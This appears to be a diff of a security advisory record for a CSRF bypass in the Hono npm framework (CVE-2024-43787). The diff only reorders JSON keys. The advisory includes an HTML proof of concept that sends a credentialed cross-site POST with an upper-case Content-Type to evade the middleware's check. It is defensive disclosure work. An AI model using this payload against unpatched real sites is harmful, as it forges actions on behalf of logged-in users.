@@ -1,21 +1,45 @@
 {
-  "id": "GHSA-rpfr-3m35-5vx5",
-  "summary": "Hono CSRF middleware can be bypassed using crafted Content-Type header",
-  "details": "### Summary\n\nHono CSRF middleware can be bypassed using crafted Content-Type header.\n\n### Details\n\nMIME types are case insensitive, but `isRequestedByFormElementRe` only matches lower-case.\n\nhttps://github.com/honojs/hono/blob/b0af71fbcc6dbe44140ea76f16d68dfdb32a99a0/src/middleware/csrf/index.ts#L16-L17\n\nAs a result, attacker can bypass csrf middleware using upper-case form-like MIME type, such as \"Application/x-www-form-urlencoded\".\n\n### PoC\n\n```html\n<html>\n  <head>\n    <title>CSRF Test</title>\n    <script defer>\n      document.addEventListener(\"DOMContentLoaded\", () => {\n        document.getElementById(\"btn\").addEventListener(\"click\", async () => {\n          const res = await fetch(\"http://victim.example.com/test\", {\n            method: \"POST\",\n            credentials: \"include\",\n            headers: {\n              \"Content-Type\": \"Application/x-www-form-urlencoded\",\n            },\n          });\n        });\n      });\n    </script>\n  </head>\n  <body>\n    <h1>CSRF Test</h1>\n    <button id=\"btn\">Click me!</button>\n  </body>\n</html>\n```\n\n### Impact\n\nBypass csrf protection implemented with hono csrf middleware.\n\n### Discussion\n\nI'm not sure that omitting csrf checks for Simple POST request is a good idea.\nCSRF prevention and CORS are different concepts even though CORS can prevent CSRF in some cases.\n",
+  "affected": [
+    {
+      "database_specific": {
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2024/08/GHSA-rpfr-3m35-5vx5/GHSA-rpfr-3m35-5vx5.json"
+      },
+      "package": {
+        "ecosystem": "npm",
+        "name": "hono",
+        "purl": "pkg:npm/hono"
+      },
+      "ranges": [
+        {
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "4.5.8"
+            }
+          ],
+          "type": "SEMVER"
+        }
+      ]
+    }
+  ],
   "aliases": [
     "CVE-2024-43787"
   ],
-  "modified": "2024-11-18T16:27:06Z",
-  "published": "2024-08-22T16:41:08Z",
   "database_specific": {
-    "nvd_published_at": "2024-08-22T15:15:16Z",
     "cwe_ids": [
       "CWE-352"
     ],
-    "severity": "LOW",
     "github_reviewed": true,
-    "github_reviewed_at": "2024-08-22T16:41:08Z"
+    "github_reviewed_at": "2024-08-22T16:41:08Z",
+    "nvd_published_at": "2024-08-22T15:15:16Z",
+    "severity": "LOW"
   },
+  "details": "### Summary\n\nHono CSRF middleware can be bypassed using crafted Content-Type header.\n\n### Details\n\nMIME types are case insensitive, but `isRequestedByFormElementRe` only matches lower-case.\n\nhttps://github.com/honojs/hono/blob/b0af71fbcc6dbe44140ea76f16d68dfdb32a99a0/src/middleware/csrf/index.ts#L16-L17\n\nAs a result, attacker can bypass csrf middleware using upper-case form-like MIME type, such as \"Application/x-www-form-urlencoded\".\n\n### PoC\n\n```html\n<html>\n  <head>\n    <title>CSRF Test</title>\n    <script defer>\n      document.addEventListener(\"DOMContentLoaded\", () => {\n        document.getElementById(\"btn\").addEventListener(\"click\", async () => {\n          const res = await fetch(\"http://victim.example.com/test\", {\n            method: \"POST\",\n            credentials: \"include\",\n            headers: {\n              \"Content-Type\": \"Application/x-www-form-urlencoded\",\n            },\n          });\n        });\n      });\n    </script>\n  </head>\n  <body>\n    <h1>CSRF Test</h1>\n    <button id=\"btn\">Click me!</button>\n  </body>\n</html>\n```\n\n### Impact\n\nBypass csrf protection implemented with hono csrf middleware.\n\n### Discussion\n\nI'm not sure that omitting csrf checks for Simple POST request is a good idea.\nCSRF prevention and CORS are different concepts even though CORS can prevent CSRF in some cases.\n",
+  "id": "GHSA-rpfr-3m35-5vx5",
+  "modified": "2024-11-18T16:27:06Z",
+  "published": "2024-08-22T16:41:08Z",
   "references": [
     {
       "type": "WEB",
@@ -38,40 +62,16 @@
       "url": "https://github.com/honojs/hono/blob/b0af71fbcc6dbe44140ea76f16d68dfdb32a99a0/src/middleware/csrf/index.ts#L16-L17"
     }
   ],
-  "affected": [
-    {
-      "package": {
-        "name": "hono",
-        "ecosystem": "npm",
-        "purl": "pkg:npm/hono"
-      },
-      "ranges": [
-        {
-          "type": "SEMVER",
-          "events": [
-            {
-              "introduced": "0"
-            },
-            {
-              "fixed": "4.5.8"
-            }
-          ]
-        }
-      ],
-      "database_specific": {
-        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2024/08/GHSA-rpfr-3m35-5vx5/GHSA-rpfr-3m35-5vx5.json"
-      }
-    }
-  ],
   "schema_version": "1.6.0",
   "severity": [
     {
-      "type": "CVSS_V3",
-      "score": "CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:L/I:L/A:L"
+      "score": "CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:L/I:L/A:L",
+      "type": "CVSS_V3"
     },
     {
-      "type": "CVSS_V4",
-      "score": "CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:P/VC:L/VI:L/VA:L/SC:N/SI:N/SA:N"
+      "score": "CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:P/VC:L/VI:L/VA:L/SC:N/SI:N/SA:N",
+      "type": "CVSS_V4"
     }
-  ]
+  ],
+  "summary": "Hono CSRF middleware can be bypassed using crafted Content-Type header"
 }
